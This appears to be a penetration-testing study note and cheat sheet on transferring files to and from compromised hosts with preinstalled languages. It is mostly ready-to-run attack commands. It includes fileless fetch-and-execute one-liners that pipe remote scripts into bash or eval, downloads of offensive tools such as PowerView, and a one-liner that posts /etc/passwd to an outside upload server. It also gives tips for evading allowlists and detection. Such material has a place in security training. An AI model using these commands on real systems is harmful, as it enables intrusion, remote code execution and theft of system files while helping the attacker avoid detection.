## Overview

It is very common to find **programming languages already installed** on target systems.

Typical languages you will encounter:

- **Linux**: Python, PHP, Perl, Ruby
    
- **Windows**: JavaScript (via `cscript`, `mshta`), VBScript
    
- **Cross-platform**: Python, JavaScript
    

📌 **Key idea:**  
If a language can:

- Make network requests
    
- Read/write files  
    → it can be used to **download, upload, or execute payloads**
    

According to Wikipedia, there are **700+ programming languages** — we only need **one** that exists on the target.

![Image](https://d2cest1yk6hx2d.cloudfront.net/uninets-001/store/3057/article%20images/file-transfer-protocol-architecture.png)

![Image](https://www.researchgate.net/publication/50305036/figure/fig1/AS%3A203217540522001%401425462245929/Process-flow-chart-of-local-installation-of-the-file-transfer-protocol-utility-operator.png)

---

## Python

Python is one of the **most valuable tools** for file transfer:

- Installed on most Linux systems
    
- Sometimes available on Windows
    
- Supports **one-liners** using `-c`
    

---

### Python 2 – Download

```bash
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

📌 Common on **older servers**

---

### Python 3 – Download

```bash
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

📌 Python 3 is now the **default** on most modern systems

---

## PHP

PHP is extremely prevalent.

📊 **Important stat (keep in mind):**  
PHP is used by **~77% of websites** with a known server-side language.

This makes PHP:

- Common on compromised web servers
    
- Very useful for **living-off-the-land** techniques
    

---

### PHP Download using `file_get_contents()`

```bash
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

✔ Simple  
✔ Reliable  
✔ Very common

---

### PHP Download using `fopen()`

```bash
php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

📌 Useful when:

- Large files
    
- More control over read/write behavior
    

---

### PHP Fileless Execution (Very Important)

```bash
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

✔ Executes **without saving to disk**  
✔ Extremely common in web-based attacks

📌 **Important Note (kept as-is):**  
The URL can be used as a filename with `@file()` if **fopen wrappers are enabled**.

---

## Other Languages

When Python or PHP are unavailable, **Ruby and Perl** are excellent fallbacks.

---

### Ruby – Download

```bash
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

---

### Perl – Download

```bash
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

✔ Perl is often installed by default  
✔ Frequently overlooked by defenders

---

## JavaScript (Windows)

JavaScript can be executed **outside the browser** on Windows using:

- `cscript.exe`
    
- `mshta.exe`
    

This makes it a powerful **LOLBIN technique**.

---

### JavaScript Download Script (`wget.js`)

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

---

### Execute JavaScript with `cscript.exe`

```cmd
cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

![Image](https://learn.microsoft.com/en-us/azure/backup/media/backup-azure-restore-files-from-vm/file-recovery-1.png)

![Image](https://www.edrawsoft.com/images/edboard/edboard500.png)

---

## VBScript (Windows)

VBScript is:

- Installed by default since **Windows 98**
    
- Frequently abused in **phishing and malware loaders**
    

---

### VBScript Download Script (`wget.vbs`)

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

---

### Execute VBScript with `cscript.exe`

```cmd
cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

✔ Very stealthy  
✔ Often bypasses naive application allowlists

---

## Upload Operations using Python 3

For uploads, we need:

1. A **server that accepts uploads**
    
2. A client capable of **HTTP POST**
    

Python’s `requests` module is perfect for this.

---

### Start Python Upload Server

```bash
python3 -m uploadserver
```

```text
File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000
```

---

### Python One-liner Upload

```bash
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

---

### Expanded Python Upload Code (Explained)

```python
import requests 

URL = "http://192.168.49.128:8000/upload"
file = open("/etc/passwd","rb")
r = requests.post(URL, files={"files": file})
```

📌 **Key concept:**  
Any language that can send **HTTP POST requests** can be used for uploads.

---

## Section Recap (Very Important)

Understanding file transfers using code helps in:

- 🔴 Red team operations
    
- 🟣 Penetration testing
    
- 🟢 Incident response
    
- 🔵 Forensics
    
- 🟡 CTF competitions
    
- ⚙️ Sysadmin troubleshooting
    

### Core Takeaways

- One-liners = speed + stealth
    
- Fileless execution reduces artifacts
    
- Languages are **tools**, not obstacles
    
- Always look for **what’s already installed**
    

---

### Cheatsheet
---

## 🧠 Code-Based File Transfer Cheat Sheet (Table Mode)

### 📥 Download Methods

|Language / Tool|Command (Example)|Notes / When to Use|
|---|---|---|
|**Python 2**|`python2.7 -c 'import urllib;urllib.urlretrieve("URL","file")'`|Legacy systems|
|**Python 3**|`python3 -c 'import urllib.request;urllib.request.urlretrieve("URL","file")'`|Most modern Linux|
|**PHP**|`php -r '$f=file_get_contents("URL");file_put_contents("file",$f);'`|Web servers|
|**Ruby**|`ruby -e 'require "net/http";File.write("file",Net::HTTP.get(URI("URL")))'`|Often installed|
|**Perl**|`perl -e 'use LWP::Simple;getstore("URL","file");'`|Old but reliable|
|**wget**|`wget URL -O file`|Common on Linux|
|**curl**|`curl -o file URL`|Works almost everywhere|
|**JavaScript (Windows)**|`cscript wget.js URL file`|PowerShell blocked|
|**VBScript (Windows)**|`cscript wget.vbs URL file`|LOLBin, stealthy|
|**SCP**|`scp user@IP:/path/file .`|SSH allowed|

---

### ⚡ Fileless Execution (No Disk Write)

|Tool|Command|Why It Matters|
|---|---|---|
|**curl**|`curl URL \| bash`|Fast, stealth|
|**wget**|`wget -qO- URL \| bash`|Quiet execution|
|**PHP**|`php -r '@file("URL") && array_map("eval",file("URL"));'`|Webshell-friendly|
|**Python 3**|`python3 -c 'import urllib.request,os;os.system(urllib.request.urlopen("URL").read().decode())'`|Full in-memory|

---

### 📤 Upload Methods

|Language / Tool|Command (Example)|Requirements|
|---|---|---|
|**Python 3**|`python3 -c 'import requests;requests.post("http://IP:8000/upload",files={"files":open("file","rb")})'`|uploadserver|
|**curl**|`curl -X POST http://IP/upload -F 'files=@file'`|HTTP allowed|
|**SCP**|`scp file user@IP:/path/`|SSH outbound|
|**FTP (scripted)**|`ftp -n -s:ftp.txt`|FTP allowed|

---

### 🔁 Base64 (No Network Required)

|Direction|Command|Platform|
|---|---|---|
|Encode|`base64 file -w 0`|Linux|
|Decode|`echo BASE64 \| base64 -d > file`|Linux|
|Encode|`[Convert]::ToBase64String((Get-Content file -Encoding Byte))`|Windows|
|Decode|`[IO.File]::WriteAllBytes("file",[Convert]::FromBase64String("BASE64"))`|Windows|

---

### 🧰 Quick Decision Table

|Situation|Best Method|
|---|---|
|PowerShell blocked|JS / VBScript|
|No tools available|Base64|
|Disk writes risky|Fileless (pipe)|
|Need upload|Python + requests|
|Legacy Linux|Perl / PHP|
|SSH allowed|SCP|

---

### 🎯 Exam & Real-World Tips

- Always try **fileless first**
    
- Use **what’s already installed**
    
- Expect **Python → PHP → Perl fallback**
    
- Uploads require **server setup first**
    
- Touching disk = **higher detection**
